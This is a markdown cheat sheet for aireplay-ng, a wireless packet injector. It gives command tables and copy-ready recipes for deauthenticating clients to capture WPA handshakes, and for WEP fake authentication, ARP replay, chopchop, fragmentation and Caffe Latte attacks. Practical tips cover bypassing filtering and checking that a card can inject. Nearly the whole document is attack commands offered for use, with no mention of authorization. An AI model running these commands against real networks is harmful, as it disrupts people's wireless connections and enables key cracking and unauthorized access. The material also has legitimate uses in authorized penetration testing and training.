# aireplay-ng — wireless packet injector

> **The deauth / replay hammer.** Forces handshakes, replays ARPs for WEP, fakes authentication.

**Install check:** `aireplay-ng --help`

---

## 🎯 Cheat-flow

| Attack | Flag | Command |
|---|---|---|
| **Deauth** (force WPA handshake) | `--deauth` / `-0` | `aireplay-ng -0 5 -a <BSSID> wlan0mon` |
| Deauth one client | `-0` + `-c` | `aireplay-ng -0 5 -a <BSSID> -c <STA> wlan0mon` |
| Injection test | `--test` / `-9` | `aireplay-ng -9 wlan0mon` |
| Fake auth (WEP) | `--fakeauth` / `-1` | `aireplay-ng -1 0 -a <BSSID> -h <myMAC> wlan0mon` |
| ARP replay (WEP IVs) | `--arpreplay` / `-3` | `aireplay-ng -3 -b <BSSID> -h <myMAC> wlan0mon` |
| Interactive replay | `--interactive` / `-2` | `aireplay-ng -2 -b <BSSID> -h <myMAC> wlan0mon` |
| Chopchop (WEP) | `--chopchop` / `-4` | `aireplay-ng -4 -b <BSSID> -h <myMAC> wlan0mon` |
| Fragmentation (WEP) | `--fragment` / `-5` | `aireplay-ng -5 -b <BSSID> -h <myMAC> wlan0mon` |
| Caffe Latte (client attack) | `-6` | `aireplay-ng -6 -e <ESSID> -h <myMAC> wlan0mon` |

---

## 🔑 Common flags

| Flag | Meaning |
|---|---|
| `-a <BSSID>` | Target AP MAC |
| `-c <STA>` | Target client MAC (FF:FF:FF:FF:FF:FF = broadcast deauth) |
| `-h <MAC>` | Source (your) MAC |
| `-e <ESSID>` | Target network name |
| `-b <BSSID>` | Alternate target syntax |
| `-0 <count>` | Number of deauths (0 = forever) |
| `-x <pkts/s>` | Rate-limit sent packets |

---

## 📋 Recipes

```bash
# 1. Typical WPA handshake grab (run airodump in another shell)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 2. Deauth a single client (more reliable)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 3. Check your card can inject
sudo aireplay-ng -9 wlan0mon

# 4. WEP classic (fake auth + ARP replay)
sudo aireplay-ng -1 0 -a <BSSID> -h <myMAC> wlan0mon
sudo aireplay-ng -3 -b <BSSID> -h <myMAC> wlan0mon
```

---

## ⚠️ Gotchas

- **Monitor mode required** — [airmon-ng](airmon-ng.md) first.
- Deauth must be **on the AP's channel** — lock airodump with `-c`.
- Some modern APs use **802.11w / PMF** which blocks unauthenticated deauth frames.
- Broadcast deauth (`-c` omitted) can be filtered — prefer targeting a specific station.
- `-0 0` loops forever — use a small count (5–10) so airodump can see the new handshake.
- Many chipsets can't inject — test with `-9` first.

---

## 🔗 Related

- [airmon-ng](airmon-ng.md) · [airodump-ng](airodump-ng.md) · [aircrack-ng](aircrack-ng.md) · [wifite](wifite.md)
